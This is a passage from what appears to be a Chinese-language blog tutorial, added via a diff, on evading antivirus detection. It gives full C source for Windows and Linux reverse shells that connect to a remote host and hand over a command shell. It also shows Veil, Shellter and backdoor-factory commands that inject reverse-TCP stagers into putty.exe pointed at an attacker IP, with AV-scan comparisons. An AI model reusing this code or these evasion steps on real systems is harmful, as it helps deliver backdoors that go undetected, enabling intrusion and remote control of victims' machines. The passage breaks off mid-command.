+对比加密前后可读字符串</h3>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230203194702433-184705601.png" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230203194821375-1857002333.png" /></p>
+<h3 id="在线病毒检测对比">6、在线病毒检测对比</h3>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230203195130186-1654008792.png" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230203195153249-1557951072.png" /></p>
+<p>有些检测引擎对加密前的shell未检测出，反而对加密后的shell检测出了……</p>
+<h2 id="自己编写shell推荐">4. 自己编写shell【推荐】</h2>
+<p>自动化工具生成或大多数人使用的shell，病毒库基本都有对应的特征码了，很容易被检测到，而自己编写的shell更容易绕过特征码。</p>
+<h3 id="windows-reverse-shell-示例">1、Windows reverse shell 示例</h3>
+<ul>
+<li><strong>win_reverse_shell.c</strong></li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winsock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;ws2_32&quot;</span>)</span></span><br><span class="line"></span><br><span class="line">  WSADATA wsaData;</span><br><span class="line">  SOCKET Winsock;</span><br><span class="line">  SOCKET Sock;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">hax</span>;</span></span><br><span class="line">  <span class="type">char</span> ip_addr[<span class="number">16</span>];</span><br><span class="line">  STARTUPINFO ini_processo;</span><br><span class="line">  PROCESS_INFORMATION processo_info;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    WSAStartup(MAKEWORD(<span class="number">2</span>,<span class="number">2</span>), &amp;wsaData);</span><br><span class="line">    Winsock=WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,<span class="literal">NULL</span>,(<span class="type">unsigned</span> <span class="type">int</span>)<span class="literal">NULL</span>,(<span class="type">unsigned</span> <span class="type">int</span>)<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">3</span>)&#123;<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Uso: &lt;rhost&gt; &lt;rport&gt;\n&quot;</span>); <span class="built_in">exit</span>(<span class="number">1</span>);&#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hostent</span> *<span class="title">host</span>;</span></span><br><span class="line">    host = gethostbyname(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">strcpy</span>(ip_addr, inet_ntoa(*((<span class="keyword">struct</span> in_addr *)host-&gt;h_addr)));</span><br><span class="line"></span><br><span class="line">    hax.sin_family = AF_INET;</span><br><span class="line">    hax.sin_port = htons(atoi(argv[<span class="number">2</span>]));</span><br><span class="line">    hax.sin_addr.s_addr = inet_addr(ip_addr);</span><br><span class="line"></span><br><span class="line">    WSAConnect(Winsock,(SOCKADDR*)&amp;hax,<span class="keyword">sizeof</span>(hax),<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;ini_processo,<span class="number">0</span>,<span class="keyword">sizeof</span>(ini_processo));</span><br><span class="line">    ini_processo.cb=<span class="keyword">sizeof</span>(ini_processo);</span><br><span class="line">    ini_processo.dwFlags=STARTF_USESTDHANDLES;</span><br><span class="line">    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;</span><br><span class="line">    CreateProcess(<span class="literal">NULL</span>,<span class="string">&quot;cmd.exe&quot;</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,TRUE,<span class="number">0</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,&amp;ini_processo,&amp;processo_info);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>编译生成win_reverse_shell.exe</strong></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc.exe win_reverse_shell.c -o win_reverse_shell.exe -lws2_32</span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230203212145236-2104947033.png" /></p>
+<ul>
+<li>注，以前用过Cygwin64，一直没卸载，所以此处是用Cygwin64编译的，警告忽略。</li>
+<li>kali下编译时会失败（未解决）</li>
+</ul>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230203220753765-865456765.png" /></p>
+<ul>
+<li><strong>测试win_reverse_shell.exe</strong></li>
+<li>若提示"无法启动此程序，因为计算机中丢失
+cygwin1.dll。尝试重新安装该程序及解决此问题"，把
+Cygwin下的cygwin.dll复制到exe同一目录就可以了</li>
+<li><strong>Kali 开启侦听</strong></li>
+</ul>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230203221533437-937629242.png" /></p>
+<ul>
+<li><strong>目标机执行win_reverse_shell.exe</strong></li>
+</ul>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230203221615553-2064164960.png" /></p>
+<ul>
+<li><strong>Kali 端状态</strong></li>
+</ul>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230203221733144-2130142965.png" /></p>
+<ul>
+<li><strong>在线查杀检测</strong></li>
+</ul>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230203222043853-618032726.png" />
+<img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230203223013751-352776918.png" /></p>
+<ul>
+<li><strong>用 hyperion.exe 加密后检测</strong></li>
+</ul>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230203223844301-2128117555.png" />
+<img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230203223946194-1799710350.png" /></p>
+<p>哎，，，看结果还不如不加密……</p>
+<h3 id="linux-reverse-shell-示例">2、Linux reverse shell 示例</h3>
+<ul>
+<li><strong>linux_reverse_shell.c</strong></li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sock</span>;</span></span><br><span class="line">    <span class="type">int</span> s;</span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">3</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;uso: &lt;rhost&gt; &lt;rport&gt;\n&quot;</span>); <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    sock.sin_family  = AF_INET;</span><br><span class="line">    sock.sin_port = htons(atoi(argv[<span class="number">2</span>]));</span><br><span class="line">    sock.sin_addr.s_addr = inet_addr(argv[<span class="number">1</span>]);</span><br><span class="line">    s = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    connect(s,(<span class="keyword">struct</span> sockaddr_in *)&amp;sock, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> sockaddr_in));</span><br><span class="line">    </span><br><span class="line">    dup2(s,<span class="number">0</span>);</span><br><span class="line">    dup2(s,<span class="number">1</span>);</span><br><span class="line">    dup2(s,<span class="number">2</span>);</span><br><span class="line">    execl(<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;httpd&quot;</span>,(<span class="type">char</span> *)<span class="number">0</span>); <span class="comment">//precess httpd</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>kali下编译</strong></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc linux_revers_shell.c -o linux_reverse_shell</span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230203222919504-80843804.png" /></p>
+<ul>
+<li><strong>测试</strong></li>
+</ul>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230203223220828-742637385.png" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230203223152741-1182865347.png" /></p>
+<ul>
+<li><strong>在线查杀检测</strong></li>
+</ul>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230203224644882-1437708026.png" />
+<img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230203224717809-420257228.png" /></p>
+<p>综上，还是推荐自己编写shell。</p>
+<h2 id="veil-免杀工具">5. Veil 免杀工具</h2>
+<h3 id="安装"><strong>1、安装</strong></h3>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install veil  </span><br><span class="line">/usr/share/veil/config/setup.sh --force --silent</span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230203235825713-145906600.png" /></p>
+<ul>
+<li>根据提示进行相应操作即可，如下图</li>
+</ul>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230204112626607-382918101.png" /></p>
+<p><strong>注意</strong>
+，若出现以下类似报错，多执行几次"/usr/share/veil/config/setup.sh --force
+--silent"命令（多半是网络不稳定，建议挂代理执行）</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230204125753013-626524866.png" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230204125921157-1037987008.png" /></p>
+<ul>
+<li><strong>"Failed to run (wine) Python pip pefile... Exit code:
+1"报错的解决</strong></li>
+</ul>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230204130354036-1432668302.png" /></p>
+<ul>
+<li><strong>解决方法：</strong></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim /usr/share/veil/config/setup.sh </span><br><span class="line"><span class="comment">#改587行的内容为下</span></span><br><span class="line">sudo -u <span class="string">&quot;<span class="variable">$&#123;trueuser&#125;</span>&quot;</span> WINEPREFIX=<span class="string">&quot;<span class="variable">$&#123;winedir&#125;</span>&quot;</span> wine <span class="string">&quot;<span class="variable">$&#123;winedir&#125;</span>/drive_c/Python34/python.exe&quot;</span> <span class="string">&quot;-m&quot;</span> <span class="string">&quot;pip&quot;</span> <span class="string">&quot;install&quot;</span> <span class="string">&quot;-Iv&quot;</span> <span class="string">&quot;pefile==2019.4.18&quot;</span></span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230204132319408-1941267588.png" /></p>
+<ul>
+<li>改后</li>
+</ul>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230204132422130-1186595176.png" /></p>
+<ul>
+<li><strong>接着再执行</strong></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/veil/config/setup.sh --force --silent</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>正常启动</strong></li>
+</ul>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230204164232255-2135153381.png" /></p>
+<h3 id="veil-evasion-生成-payload-演示">2、veil-evasion 生成 payload
+演示</h3>
+<ul>
+<li><strong>示例-1：payload用python/meterpreter/rev_tcp.py</strong></li>
+</ul>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230204170732177-700487145.gif" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230204171128304-279868419.gif" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230204171700307-644900052.png" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230204171833243-308939244.png" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230204172117484-1292696970.png" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230204172314886-880737626.png" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230204172505047-2086337940.gif" /></p>
+<ul>
+<li><strong>在线查杀测试</strong></li>
+</ul>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230204173242210-296875122.png" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230204181507418-1679493897.png" /></p>
+<h3 id="veil-catapult了解已停更">3、veil-catapult【了解，已停更】</h3>
+<ul>
+<li>实现payload的投递</li>
+<li>集成veil-evasion生成免杀payload</li>
+<li>使用impacket上传二进制payload文件</li>
+<li>使用passing-the-hash执行payload</li>
+<li>payload不写入硬盘，避免文件型病毒查杀</li>
+</ul>
+<h2 id="修改特征码免杀">6. 修改特征码免杀</h2>
+<p>前面已介绍免杀思路：编写新的shell，加密shell（Hyperion
+），不写入硬盘直接投递到内存运行（veil-catapult）</p>
+<p>新的思路是找到触发AV查杀的精确字符串，并修改</p>
+<ul>
+<li>将执行程序分片成很多小片段</li>
+<li>将包含MZ头的第一个片段与后续片段依次组合后交给AV查杀</li>
+<li>重复以上步骤直至精确定位</li>
+<li>工具：evade切片，ghex或hexeditor编辑16进制文件内容</li>
+</ul>
+<p>演示</p>
+<ul>
+<li>工具 Free File Splitter：<a
+target="_blank" rel="noopener" href="https://www.softpedia.com/get/System/File-Management/Free-File-Splitter.shtml"
+class="uri">https://www.softpedia.com/get/System/File-Management/Free-File-Splitter.shtml</a></li>
+<li>28 Best Free File Splitter Software：<a
+target="_blank" rel="noopener" href="https://listoffreeware.com/list-of-best-free-file-splitter-software/"
+class="uri">https://listoffreeware.com/list-of-best-free-file-splitter-software/</a></li>
+</ul>
+<h2 id="shellter-免杀">7. shellter 免杀</h2>
+<ul>
+<li>代码混淆</li>
+<li>定制的编码方式</li>
+<li>多态编码</li>
+<li>集成部分msf payload</li>
+<li>使用正常的exe文件作为模板，将payload加入模板，会使exe原有功能损失</li>
+</ul>
+<h3 id="安装-1">1、安装</h3>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install shellter</span><br></pre></td></tr></table></figure>
+<h3 id="演示">2、演示</h3>
+<ul>
+<li>以将 shell 加到 plink.exe为例</li>
+</ul>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230206110852630-2055330595.gif" /></p>
+<ul>
+<li><strong>功能测试</strong></li>
+</ul>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230206115543616-52746977.gif" /></p>
+<ul>
+<li><strong>在线查杀检测</strong></li>
+</ul>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230206110951861-1359037419.png" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230206111015343-782568802.png" /></p>
+<p>360也未检出</p>
+<h2 id="backdoor-factorybdf免杀">8. backdoor-factory（BDF）免杀</h2>
+<h3 id="简介">1、简介</h3>
+<ul>
+<li>patch：本是通过替换
+exe、dll、注册表等方法修复系统漏洞或问题的方法，但在
+<strong>BDF</strong> 中是
+<strong>向二进制文件中增加或者删除代码内容，注意某些受保护的二进制程序无法
+patch，且存在一定概率文件会被 patch坏掉</strong></li>
+<li><strong>patch
+选项，附加代码段，单代码洞注入，多代码洞注入</strong></li>
+<li>将 shellcode 代码 patch 进模板文件，躲避 AV 检查</li>
+<li>将shellcode代码插入代码洞中（单个/多个代码洞）</li>
+<li>将shellcode代码附加到模板文件后面</li>
+<li>使用于 windows PE x32/64 和 linux ELF x32/64 （OSX）</li>
+<li>支持 msf payload、自定义 payload</li>
+<li>python 语言编写</li>
+</ul>
+<h3 id="msf-使用的-patch-方法">2、msf 使用的 patch 方法</h3>
+<h4 id="覆盖程序入口">（1）覆盖程序入口</h4>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell/reverse_tcp……</span><br></pre></td></tr></table></figure>
+<h4
+id="创建新的线程执行-shellcode-并跳回原程序入口">（2）创建新的线程执行
+shellcode 并跳回原程序入口</h4>
+<p>msfvenom -p windows/shell/reverse_tcp -k
+#如图所示，增加代码片段跳转执行后跳回源程序入口</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230206144233580-706835801.png" /></p>
+<h3 id="ctp-方法">3、CTP 方法</h3>
+<ul>
+<li>增加新的代码段 section，与 msf 的-k 方法类似</li>
+<li>使用现有的代码裂缝/洞（code cave）存放 shellcode</li>
+<li>代码洞是二进制中超过两个字节的连续 x00
+区域（代码片段间区域），根据统计判断代码洞是编译器在进行编译是造成的，不同的编译器造成的代码洞的大小不同。推荐文章：<a
+target="_blank" rel="noopener" href="https://captmeelo.com/exploitdev/2018/07/16/backdoor101-part1.html"
+class="uri">https://captmeelo.com/exploitdev/2018/07/16/backdoor101-part1.html</a></li>
+</ul>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230206144539188-1991705981.png" /></p>
+<ul>
+<li>单个代码洞代销不足以存放完整的
+shellcode，就多代码洞跳转（非顺序执行）如图所示，初期免杀率可达100%</li>
+</ul>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230206144606168-987795210.png" /></p>
+<ul>
+<li>结合 msf 的 stager 方法（附加代码段）</li>
+</ul>
+<h3 id="实例演示">4、实例演示</h3>
+<h4 id="安装基于-python2-环境"><strong>（1）安装【基于 python2
+环境】</strong></h4>
+<ul>
+<li><strong>pip2 的安装</strong></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://bootstrap.pypa.io/pip/2.7/get-pip.py</span><br><span class="line">sudo python2 get-pip.py  </span><br></pre></td></tr></table></figure>
+<p>老版本Kali（如kali-linux-2.0-amd64）已经安装好了 backdoor-
+factory及bdfproxy(后面会用到)，可以直接拿来用。新版本需要我们自己安装，方法如下：</p>
+<ul>
+<li><strong>方法一：</strong></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install backdoor-factory</span><br></pre></td></tr></table></figure>
+<p><strong>注意</strong> ，kali部分版本自带的 backdoor-factory
+并不能识别可执行文件，存在以下问题（backdoor-factory -f putty.exe
+-S）</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230207002427449-1517427071.png" /></p>
+<ul>
+<li><strong>方法二【推荐】：</strong></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/secretsquirrel/the-backdoor-factory.git  </span><br><span class="line">pip2 install capstone  </span><br><span class="line">```  </span><br><span class="line"></span><br><span class="line">直接运行会提示 <span class="string">&quot;No module named pefile&quot;</span></span><br><span class="line"></span><br><span class="line">![](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230207003300953-514935239.png)</span><br><span class="line"></span><br><span class="line">可以先尝试pip直接安装，不过可能会出错，如图：</span><br><span class="line"></span><br><span class="line">![](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230207003526835-1038201730.png)</span><br><span class="line"></span><br><span class="line">可以先将 pefile</span><br><span class="line">包下载下来手动安装（如图），注意下载的版本（因要安装在python2下）：[https://github.com/erocarrera/pefile/releases/download/v2019.4.18/pefile-2019.4.18.tar.gz](https://github.com/erocarrera/pefile/releases/download/v2019.4.18/pefile-2019.4.18.tar.gz)</span><br><span class="line"></span><br><span class="line">![](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230207003931596-9845661.png)</span><br><span class="line"></span><br><span class="line">再次运行后可能会提示 <span class="string">&quot;No module named builtins&quot;</span>，可直接用 <span class="string">&quot;pip2 install future&quot;</span> 安装或同 pefile</span><br><span class="line">一样先下载相应包，再用 <span class="string">&quot;python2 ./setup.py install&quot;</span> 安装。</span><br><span class="line"></span><br><span class="line">future模块：&lt;https://files.pythonhosted.org/packages/8f/2e/cf6accf7415237d6faeeebdc7832023c90e0282aa16fd3263db0eb4715ec/future-0.18.3.tar.gz&gt;</span><br><span class="line"></span><br><span class="line">![](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230207004441352-194350580.png)</span><br><span class="line"></span><br><span class="line">  * **最终结果**</span><br><span class="line"></span><br><span class="line">**![](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230207005907475-44214961.png)**</span><br><span class="line"></span><br><span class="line"> PE文件也能识别了</span><br><span class="line"></span><br><span class="line">![](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230207005005420-455175864.png)</span><br><span class="line"></span><br><span class="line"><span class="comment">#### （2）以putty为例进行注入</span></span><br><span class="line"></span><br><span class="line">  * 检查二进制文件是否支持代码注入</span><br><span class="line"></span><br><span class="line">```bash</span><br><span class="line">./backdoor.py --file=../putty.exe -S  <span class="comment">#-S：检查二进制文件是否支持代码注入</span></span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230207005005420-455175864.png" /></p>
+<ul>
+<li>查找可用代码洞</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./backdoor.py --file=../putty.exe -c -l 200 <span class="comment">#查看裂痕， -c：code cave(代码裂缝)，-l：代码裂缝大小，不小于200</span></span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230207010838912-1036834930.gif" /></p>
+<ul>
+<li>查看有效载荷</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./backdoor.py --file=../putty.exe -s show <span class="comment">#-s SHELL, --shell=SHELL:可以使用的有效负载。使用&quot;show&quot;来查看有效载荷</span></span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230207010854273-992174707.gif" /></p>
+<ul>
+<li>注入putty，以iat_reverse_tcp_stager_threaded为例，默认注入单代码洞，-J是注入多代码洞（需自主选择位置），-a在代码段后面新加个section注入代码</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">./backdoor.py --file=../putty.exe  -s iat_reverse_tcp_stager_threaded -H 192.168.159.129 -P 4444 -o putty-bdf.exe </span><br><span class="line">./backdoor.py --file=../putty.exe  -s iat_reverse_tcp_stager_threaded -H 192.168.159.129 -P 4444 -J -o putty-bdf-J.exe</span><br><span class="line">./backdoor.py --file=../putty.exe  -s iat_reverse_tcp_stager_threaded -H 192.168.159.129 -P 4444 -a -o putty-bdf-a.exe  </span><br><span class="line">```  </span><br><span class="line"></span><br><span class="line">![](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230207012104892-1317743509.gif)</span><br><span class="line"></span><br><span class="line">![](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230207012302081-187169481.png)</span><br><span class="line"></span><br><span class="line">  * **功效测试**</span><br><span class="line"></span><br><span class="line">```bash</span><br><span 